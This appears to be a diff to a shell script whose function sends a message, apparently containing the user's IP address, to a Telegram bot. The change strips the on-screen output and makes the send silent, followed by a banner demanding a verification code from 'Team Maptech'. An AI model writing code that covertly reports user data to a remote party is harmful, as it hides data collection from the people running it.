@@ -60,21 +60,8 @@ send_telegram_message() {
     local url="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
     local data="chat_id=$CHAT_ID&text=$message"
     
-    echo "Sending message to Telegram..."
-    echo "IP Address: $ip_address"
-    echo "Message: $message"
-    echo "URL: $url"
-    echo "Data: $data"
-    
-    response=$(curl -s -X POST "$url" -d "$data")
-    
-    echo "Response: $response"
-    
-    if [[ $response == *'"ok":true'* ]]; then
-        echo "Message sent successfully."
-    else
-        echo "Failed to send message."
-    fi
+    # Send message to Telegram
+    curl -s -X POST "$url" -d "$data" > /dev/null
     
     echo -e "\033[1;36m=============================================================\033[0m"
     echo -e "\033[1;31m       CONTACT TEAM MAPTECH FOR VERIFICATION CODE\033[0m"
